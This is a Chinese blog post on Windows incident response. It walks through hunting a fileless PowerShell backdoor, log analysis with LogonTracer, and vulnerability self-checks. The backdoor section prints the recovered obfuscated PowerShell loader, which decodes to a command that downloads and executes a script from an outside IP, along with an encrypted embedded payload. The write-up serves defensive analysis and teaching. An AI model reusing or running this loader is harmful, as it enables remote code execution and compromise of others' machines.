Windows应急响应分析
=============

写在前面
----

在最近几年中，网络安全正在慢慢的走入人的视野，越来越多的人学安全，了解安全。在Windows攻击思路上也非常新颖，无文件攻击受到了很多人的关注如：无文件挖矿、无文件后门等等，面对别人的攻击如何快速的处理，显得格外的重要，并且能够发现系统所隐藏的缺陷和如何加强防御也是我们需要掌握的。

**在Windows应急响应中我们可以从以下几个方面进行排查windows主机：**

1、是否有异常进程、用户  
2、敏感端口开放情况  
3、密码强度  
4、日志分析  
5、异常启动项、服务、计划任务  
6、注册表信息  
7、系统缺陷  
8、流氓软件  
9、其他

实战无文件后门应急响应
-----------

powershell做为微软windows系统自带的软件包，具有十分强大的功能，Windows PowerShell 是一种命令行外壳程序和脚本环境,使命令行用户和脚本编写者可以利用 .NET Framework的功能，在IT/系统管理员间得到普及。总的特点来说就是:方便、有效和隐蔽。举例来说，利用这些合法工具可以让威胁活动混在正常的网络流量或IT/系统管理工作内，也让这些恶意威胁能够留下较少的痕迹，使得侦测更加困难。  
**powershell参数简介如下所示：**  
-NoP 不加载Windows PowerShell配置文件  
-NonI 命令行运行后不和用户进行交互  
-W Hidden 将命令行运行窗口隐藏  
-E 接受base-64编码字符串版本的命令

首先使用netstat -ano查看网络连接情况，从中可以看到很多外网ip

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-38bd86e0530a89fa9a24d812c2aed9724db2ab7e.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-38bd86e0530a89fa9a24d812c2aed9724db2ab7e.png)

其他常用命令

```php
netstat -ano | findstr “port”查看端口对应的活动连接
tasklit | findstr “PID” 查看相应PID的进程
显示系统信息 systeminfo 
查看远程主机的系统信息 systeminfo /S ip /U domain\user /P Pwd 
显示进程和服务信息 tasklist /svc 
显示所有进程以及DLL信息 tasklist /m 
显示进程和所有者 tasklist /v 
查看远程主机的进程列表 tasklist /S ip /v 
显示具体的服务信息（包括二进制路径和运行使用） sc qc Spooler
检查DirectX信息 dxdiag2. 
检查Windows版本winver
扫描错误并复原sfc /scannow
系统文件检查器 sfc.exe 
netstat -ano | findstr “port”查看端口对应的活动连接
tasklit | findstr “PID” 查看相应PID的进程
```

搜索一下ip地址，第一个就出现国外的地址，但这里出现了一个微软云（注意很多我们服务器上的软件也会请求外网的ip，而这里又出现了微软云，还不能确定，网上搜索查询名发现是常用程序，威胁情报中心分析进程，上传互联网上扫描，并未发现问题,存疑后门分析）

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-89193e8251db75fb68cd3ea678136011366706df.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-89193e8251db75fb68cd3ea678136011366706df.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-457bc5276d3d82606fbdac120203c8420d60a525.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-457bc5276d3d82606fbdac120203c8420d60a525.png)

这个ip直接定性为钓鱼攻击（此时我的重点就放在这个ip了）

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c8205f8700bed61317fec131b22dc97bca088f72.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c8205f8700bed61317fec131b22dc97bca088f72.png)

**威胁情报常见平台（根据域名、ip、文件定性）**  
奇安信威胁情报中心  
<https://ti.qianxin.com/>  
深信服威胁情报中⼼  
<https://sec.sangfor.com.cn/analysis-platform>  
微步在线  
<https://x.threatbook.cn/>  
venuseye  
<https://www.venuseye.com.cn/>  
安恒威胁情报中⼼  
<https://ti.dbappsecurity.com.cn/>  
360威胁情报中⼼  
<https://ti.360.cn/#/homepage>

这里使用Process Hacker进行进程查找，找到该程序后，网上搜索查询名发现是常用程序，威胁情报中心分析进程，上传vt上进行查杀，并未发现问题，在这里我一直都在研究这个ip，导致一直未发现问题浪费了我一大把时间，所以说有的时候不能一根筋（这里存疑后面再查看其他ip）

继续分析其他进程，这里我换了个火绒剑进行分析，而当查找到最后一个ip的进程时，发现是powershell进程，最可疑的是有两个powershell进程。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-00b7e5853e70b975b5553b0652bcf1e94b64917a.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-00b7e5853e70b975b5553b0652bcf1e94b64917a.png)

一般powershell打开是只有一个powershell进程如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ceb6074349d091e54b444c9a88d89a7428f9d1de.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ceb6074349d091e54b444c9a88d89a7428f9d1de.png)

这肯定是有问题的，对于无文件攻击在学内网攻击时还是挺熟悉的，面对上面的情况，要么攻击者直接运行命令然后下载执行要么有一个powershell脚本，要是直接下载很难有办法知道它运行的语句，这里我使用Process Hacker将内存dump下来分析，来碰碰运气。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-03736d8c77e90a6710fcb05ab911491ecb13a570.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-03736d8c77e90a6710fcb05ab911491ecb13a570.png)

在这个如此多内容的文件中，想要找到代码真的是很难，需要非常有耐心，师傅们可以写一写脚本提取文件中的代码。终于算是找到一串可疑的代码。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4173701d5313703f941a88aecbfdd34d73c78c26.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4173701d5313703f941a88aecbfdd34d73c78c26.png)

面对下面的脚本内容说实话有点看不懂，知道中间是进行base64进行解码，将上述代码保存为ps1格式上传到VT杀毒网，查杀率只有5/56，后面有机会学习一下powershell免杀。

```php
Set-StrictMode -Version 2

 & ((VaRIAble '*mdR*').NaME[3,11,2]-join'')( -joiN ( '36M68M111X73A116G61~32~40B40G78M101G119T45j79j98T106~101B99X116T32X83v121G115B116T101A109~46v78i101M116X46X87B101X98i99v108M105M101A110j116X41B46v68T111~119T110T108M111X97X100A83~116T114M105~110A103j40T39v104j116v116j112T58X47v47v52T55G46i49i49M51j46j50~49M55X46X49X50X56v47B115M115j121M121B46~116G120T116G39B41X41'.SPLIT('A~TGiBXvjM')|fOReAcH-obJeCt { ( [inT] $_-as [CHAr]) })) 

$mksec=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($DoIt))

If ([IntPtr]::size -eq 8) {
    ( [RuNtime.INtERopserVIces.mArShAL]::([RunTiME.inTEROPservICeS.marshAL].GETmEmberS()[3].NAME).iNvOKe([RuNtImE.InteropSeRViCeS.MarSHAl]::SecUreSTriNGToBsTR( $('76492d1116743f0423413b16050a5345MgB8AFkALwBLAEIAdwA1AGsATQBiAGkATABNAGoAVgB2AE8AVQBJAEQAbQBSAGcAPQA9AHwAYwA4AGQAZgBkAGIAMQA1ADMAZQA4ADAAYwA5ADkAYQBiAGEAMQBlADgAMAA0ADQAZgAyAGIAMgBhADQAZAA1ADgAYQBjAGQAZQA5AGIAMQAwADYAZAA4AGQAZQAxAGEAZgBkAGUAZgA4ADkAMQAyADMAYgA2ADkAMgA4AGMAYQAxADUAMQBmADQANABkAGMAZgA2ADYAOQA4ADYAOAAxADUAMQAwAGEANwBmAGUANwAwADEAMwA1ADEAMgBlADkAOQAwADIAYgAxADgAZQAzAGYAYQBkADQAZgA1ADUAZgBiADcAOQBhAGYAZgA4ADcAOAAyAGQANwAzAGYAMgBiAGUAMQA2AGYAMgA0ADIAZQBjADUANwBiAGEANwBjADcAZgA3AGMAYwA2ADQAZQA5AGYANgBiAGQAYwA5ADIANwA5ADMAZgBlAGYAYwBlADMAZAAzADcAYgBhADMANAAzADEANABhADkAZgA1AGMANQAyADEAYgAzAGEAMQBjADYAYgA5ADMAOQAxAGEAMAA0ADQAOAAyADAAMAA4ADEANgBhADUAMgBiAGYAYgAyAGYAZgA4AGUAZQBkADkAOQAzAGMAMAA3ADcANwBlADIAZgA1AGYANQA3ADAAZQAyAGUAYwA1ADkAYwAyADYAOAAzADgANABiADQAZgBiAGUAZABiAGIAMQA2AGMAOABjAGIAZQBkADAAMQAzAGUANgBmADcAYQA5AGIAMgAwADUAMgBkAGEAMAA0AGUAZQA3AGQAMwAyADUAMABiADAAYQA5AGMAZAA2ADkAMwAyAGUAYgA2ADQANwBjADAAMAA3AGQAYwAwADQAZAA2ADQANAAxAGMAYgBmAGMAOAA3AGYAMgBmADAAYwA0ADAAOQAwADgAYgAzADcAOABmADUAZAA2ADMAMAA0AGQAMgBhAGMANQAyADgAOAAzADAAMwA2ADEAOAAxAGMAYQA3ADIAZQBjADMANwBhADUAZgBkADUAYwA5AGQAZABjADYAZQBlAGUAYQBkAGIAYgAxADcAOQAyAGMAOQBmADQAYQBiAGIAZQAxADMANwAxADAAMQBlAGUANAAzADIAMQAyAGEAOABmADAAZAAyAGQAYgAxAGUANQA1ADEAZAA2AGEANQBhAGEANwAwAGMAYwAwAGQANABjADQAZgA5AGIAMgA3AGIAYgBhAGEANAAzADEAZgAyAGIAZgBlAGMAYQBlAGQAOQAxADAANQAzADMANwAzADYAMgAwADcANAA1ADkAZABkADAA'|coNVERtTO-SeCuReSTrinG  -k (40..63)) ) ))| .((Get-VarIABlE '*mDr*').nAME[3,11,2]-JOIn'')

}
else {
    IEX $mksec
}
```

面对时上面的代码根本不知道咋回事，只能先查找主机中该后门文件，在查找文件时，不借用工具，是非常麻烦的事。因为很多你压根不知道别人命名的文件是啥。

在Windows上打开此电脑---&gt;查看----&gt;选项----&gt;有一个快速访问,记得勾选有的时候很有用，但这里并没有发现有可疑文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-9d94fed4609c7c8940176abf38c31f8c4cce98a6.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-9d94fed4609c7c8940176abf38c31f8c4cce98a6.png)

于是借助工具搜索，这个fileseek在web攻击应急响应分析已经有介绍不多介绍了，直接查找到该文件，并将其删除。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-423aa644f49ceaf8010a9e1ccb4e510cbe052678.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-423aa644f49ceaf8010a9e1ccb4e510cbe052678.png)

最后使用net user查看了有无可疑用户（注意net user并不能完全确定有无可疑用户，比如我把用户隐藏了,这个命令也查不出来，最好的办法是去注册表上查找）具体查看请参考：  
<https://zhidao.baidu.com/question/448221277.html>  
后面查看了启动项等信息并未发现异常，无文件后门分析完毕。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7f23aa3fe887aa9c23654ab7da30567edd09acef.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7f23aa3fe887aa9c23654ab7da30567edd09acef.png)

当然这里还有无文件挖矿，请参考这两篇文章：  
<https://www.freebuf.com/articles/system/206611.html>  
<https://www.freebuf.com/articles/network/216918.html>

系统缺陷导致系统瘫痪
----------

在微软官方曾经通报过一个服务器问题在Windows 7、Windows Server 2008、Windows Server 2008 R2可能该应用系统大量40000或50000以上的端口会话均处于TIME\_WAIT状态。在系统启动时从 497 天后所有在TIME\_WAIT状态的 TCP/IP 端口都不会被关闭。因此， TCP/IP 端口可能会被用光，并且可能不会创建新的 TCP/IP 会话，造成系统瘫痪，所以说系统缺陷也是一个排查方向。在网上也有人问这样的问题，有的时候我们还是要关注一下微软官方通报的公告。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-033f08a90756d276313d05fe27ee3e24701a103c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-033f08a90756d276313d05fe27ee3e24701a103c.png)

**解决方案请参考：**  
<https://support.microsoft.com/zh-cn/kb/2553549>

流氓软件分析
------

有一些网站提供软件，但是这些软件经常捆绑一些其他软件，导致运行内存和cpu给占用，并且不断推送广告。在平时的生活中我也帮身边的朋友处理过这些问题，就是电脑配置很好但是却非常卡。清除流氓软件一般有以下方法  
1、结束任务管理器中的进程，并且找到该文件，将其删除  
2、借用360安全卫士或者火绒安全里面的文件粉碎工具进行粉碎文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c9751ab78dde0e077e402ad84fde247a02a768f5.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c9751ab78dde0e077e402ad84fde247a02a768f5.png)

在安装的时候一般会出现以下界面，见到这个见面最好放弃安装。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-10633d7b999eba6a74d8a98414df484d51fb87c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-10633d7b999eba6a74d8a98414df484d51fb87c4.png)

Windows系统日志分析
-------------

Windows操作系统在其运行的生命周期中会记录其大量的日志信息，这些日志信息包括：Windows事件日志（Event Log），Windows服务器系统的IIS日志，FTP日志，Exchange Server邮件服务，MS SQL Server数据库日志等。处理应急事件时，客户提出需要为其提供溯源，这些日志信息在取证和溯源中扮演着重要的角色。  
Windows事件日志文件实际上是以特定的数据结构的方式存储内容，其中包括有关系统，安全，应用程序的记录。每个记录事件的数据结构中包含了9个元素（可以理解成数据库中的字段）：日期/时间、事件类型、用户、计算机、事件ID、来源、类别、描述、数据等信息。应急响应工程师可以根据日志取证，了解计算机上上发生的具体行为。  
查看系统日志方法，Windows系统中自带了一个叫做事件查看器的工具，它可以用来查看分析所有的Windows系统日志。而我并不是很喜欢用自带的，因为并不是很直观，我一般使用LogFusion直观明了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1f4e3e97a9664dc9460a174286d072a4fab58c6c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1f4e3e97a9664dc9460a174286d072a4fab58c6c.png)

在手动进行日志分析时需要熟悉以下内容  
**事件说明**  
1102 清理审计日志  
4624 账号成功登录  
4625 账号登录失败  
4672 授予特殊权限  
4720 创建用户  
4726 删除用户  
4728 将成员添加到启用安全的全局组中  
4729 将成员从安全的全局组中移除  
4732 将成员添加到启用安全的本地组中  
4733 将成员从启用安全的本地组中移除  
4756 将成员添加到启用安全的通用组中  
4757 将成员从启用安全的通用组中移除  
4719 系统审计策略修改  
4768 Kerberos身份验证（TGT请求）  
4769 Kerberos服务票证请求  
4776 NTLM身份验证  
这里手工日志分析不展开介绍，下面介绍一款使用的工具。

借助LogonTracer进行日志分析
-------------------

LogonTracer这款工具是基于Python编写的，并使用Neo4j作为其数据库（Neo4j多用于图形数据库），是一款用于分析Windows安全事件登录日志的可视化工具。它会将登录相关事件中的主机名（或IP地址）和帐户名称关联起来，并将其以图形化的方式展现出来，使得在日志取证时直观清晰。

使用Docker搭建LogonTracer

Docker安装过程就略过了。接下来将详细介绍如何使用Docker搭建LogonTracer：

1、开启docker服务

```php
service docker start
```

2、拉取logontracer镜像

```php
docker pull jpcertcc/docker-logontracer
```

运行镜像

```php
docker run --detach --publish=7474:7474 --publish=7687:7687 --publish=8080:8080 -e LTHOSTNAME=192.168.1.109 jpcertcc/docker-logontracer（其中LTHOSTNAME值对应修改为本地IP）
```

做到这一步时，可能会遇到即使正确输入默认密码后仍一直提示账号密码错误，这时可以修改neo4j.conf配置文件，取消验证机制，该文件在conf目录下。

```php
docker exec -it 61b68a468484 /bin/sh     (其中61b68a468484为容器ID号，通过docker ps -a可查看）

vim conf/neo4j.conf(这里我踩了一个大坑，一直提示/bin/sh: 7: vim: not found，第一开始查看了一下自己的虚拟机有没有安装vim，确认自己安装了，然后一直到处找答案，到底要怎么搞，在这期间花费了很长时间，才得到解决，原来docker容器也要安装vim
apt-get install vim)
```

找到文件内容：`#dbms.security.auth_enabled=false`  
将前面的#号去掉，修改为`dbms.security.auth_enabled=false`  
（重启镜像才生效，当前可以暂时不重启，因为下面还有需要重启的地方，到时一次重启即可。）  
输入完密码连接成功后(这里要注意一个点，不能将页面翻译成中文，再输入密码的时候不然会报错)，在如下图的输入框中输入如下命令，点击右侧的按钮执行。

```php
MATCH(n)
OPTIONAL MATCH (n)-[r]-()
DELETE n,r
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3f0f8884b24260e4c48f04ed31d270e25b1b499b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3f0f8884b24260e4c48f04ed31d270e25b1b499b.png)

5、访问LogonTracer界面

```php
http://[本机IP地址]:8080
```

此时，通过上述4步之后LogonTracer的Docker环境已经搭建好并可以正常运行，但是，由于打开的页面中有2个JS文件调用的是远程网址，这2个网址由于一些原因在国内无法正常访问，所以，在通过浏览器访问首页后，点击“Upload Event Log”按钮是无反应的，那就无法上传日志文件，这就是需要解决的坑。  
解决这个坑要对2处JS进行修改：  
第一处JS：  
`https://cdn.rawgit.com/neo4j/neo4j-javascript-driver/1.4.1/lib/browser/neo4j-web.min.js`  
解决办法：直接修改系统的hosts文件，手动将域名cdn.rawgit.com解析到151.139.237.11上，该网址就可以正常访问了。

执行命令：

```php
vim /etc/hosts
然后在hosts文件中添加一行：
151.139.237.11 cdn.rawgit.com
```

第二处JS：  
`https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js`  
解决方法：进入Docker镜像编辑index.html模板文件。  
执行命令：

```php
docker exec -it 61b68a468484 /bin/sh (其中61b68a468484为容器ID) 
```

进入Docker镜像的终端内执行命令，编辑模板文件：

```php
vim /usr/local/src/LogonTracer/templates/index.html
```

找到  
`https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js`  
将该网址的改为  
`https://ajax.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js`

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-0b0436ae74155a55ca1fe9514f0954b93b59a090.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-0b0436ae74155a55ca1fe9514f0954b93b59a090.png)

点击左侧的“UploadEvent Log”上传保存在本机的evtx格式或者XML格式的Windows安全日志文件，点击“Browse”选择日志文件，然后点击“Upload”，进行上传。这时候就完美解决了上传按钮点不了的问题了。

这里还需要介绍几条docker容器的命令，在实践的时候可能用得到

```php
列出所有的容器 ID
docker ps -aq
查看所有正在运行容器
docker ps
停止所有的容器
dock er stop $(docker ps -aq)
删除所有的容器
docker rm $(docker ps -aq)
删除所有停止的容器
docker container prune
删除指定容器
docker rm -f <containerid> 
开启指定容器
docker start 61b68a468484 
关闭指定容器
docker stop 61b68a468484
重启指定容器
docker restart 61b68a468484
```

**LogonTracer功能介绍**

1、在LogonTracer界面左侧，就是对日志文件进行分析的功能选项。  
All Users：查看所有用户的登录信息  
SYSTEM Privileges：查看管理员账号的登录信息（一般登录类型3或10）  
NTLM Remote Logon：查看NTLM远程登录信息（登录类型3）  
RDP Logon：查看RDP远程桌面登录信息（登录类型10）  
Network Logon：查看网络登录信息（登录类型3）  
Batch Logon：查看批处理登录信息（登录类型4）  
Service Logon：查看服务登录信息（登录类型5）  
Ms14-068 Exploit Failure：MS14-068漏洞利用失败信息  
Logon Failure:查看登录失败信息  
Detect DCsync/DCShadow：查看删除 DCsync/DCShadow信息  
Add/Detect Users：查看添加/删除用户信息  
Domain Check：域检查信息  
Audit Policy Change：查看审计策略变更信息  
这里就附上一张图看看效果

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cdeea5ac26458ff8cbc958394c01a930fbfed17c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cdeea5ac26458ff8cbc958394c01a930fbfed17c.png)

经常会出现以下问题  
问题1：使用docker安装完LogonTracer运行时，界面一直处于加载状态。Dark Mode可以调为黑色。  
解决方法：不妨换个浏览器试试，如火狐或谷歌浏览器。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b5c00ee88a68bda4fa9de70891e0373a1e4bd945.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b5c00ee88a68bda4fa9de70891e0373a1e4bd945.png)

上传文件时经常出现解析出错，原因是Time Zone（时区）选项值选错了，中国的UTC为+8，因此Time Zone下拉选项框中选择8。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d1f7681d1859ddeaf1d92c7312a0e1a44342687c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d1f7681d1859ddeaf1d92c7312a0e1a44342687c.png)

多种工具配合快速自查
----------

在应急响应时，除了处理上述顾客反映的问题，还可以帮顾客检测一些系统漏洞，当然这样也可以让自己的报告更有东西，也是在无攻击者攻击思路的一种方法，这里介绍一个自动搜集主机上漏洞的工具WindowsVulnScan，该工具一直再更新，非常实用，除了主机漏洞信息外还需要收集系统安装的各个服务。再配合searchsploit来快速复现  
**WindowsVulnScan下载地址**：<https://github.com/chroblert/WindowsVulnScan>  
**searchsploit下载地址：**  
<https://github.com/offensive-security/exploitdb>  
使用以下命令来快速收集系统安装的服务：  
`Get-WmiObject -class Win32_Product`

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ea8afb1f2d5e3f80193db17cc7eac4d5a8fd7bea.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ea8afb1f2d5e3f80193db17cc7eac4d5a8fd7bea.png)

**WindowsVulnScan使用**  
**主要功能**  
查找主机上具有的CVE  
查找具有公开EXP的CVE  
**实现原理**  
搜集CVE与KB的对应关系。首先在微软官网上收集CVE与KB对应的关系，然后存储进数据库中  
查找特定CVE网上是否有公开的EXP  
利用powershell脚本收集主机的一些系统版本与KB信息  
利用系统版本与KB信息搜寻主机上具有存在公开EXP的CVE

首先运行powershell脚本`KBCollect.ps`收集一些信息  
`.\KBCollect.ps1`  
将运行后产生的`KB.json`文件移动到`cve-check.py`所在的目录  
安装一些python3模块  
`python3 -m pip install requirements.txt`  
运行`cve-check.py -u`创建CVEKB数据库  
运行`cve-check.py -U`更新CVEKB数据库中的`hasPOC`字段  
此处可以使用-m选择更新模式。

```php
  -m All:更新所有
  -m Empty:只更新hasPOC字段为空的
  -m Error:只更新hasPOC字段为Error的
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a5ca4c1c29cf1306f72c7302c7e9144891942f14.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a5ca4c1c29cf1306f72c7302c7e9144891942f14.png)

如何加强防御
------

1、web网站及时修复漏洞  
2、对服务器第三方服务比如MySQL、Redis、FTP等等漏洞防护  
3、防止被社工、提高自己的安全意识，人为因素产生的比如一些密码之类的隐患要尽量避免。  
4、加强防护软件的部署、及时做好数据备份等  
5、部署监控器，当遭受攻击时第一时间通过邮箱、微信等通知你  
请参考https://www.jianshu.com/p/800c1967c7e5

总结
--

应急响应需要我们发散思维，从不同的角度去思考问题，会起到很好的效果。应急响应是一个不断总结的过程，通过总结应急的能力也会提升，对每一次应急响应进行反思，及时扩充知识，那么学到的东西并不比红队差，同时也可以学到一些新的攻击手法比如如何更好的隐藏自己，当今主流的攻击手段是什么，如无文件攻击的具体方式。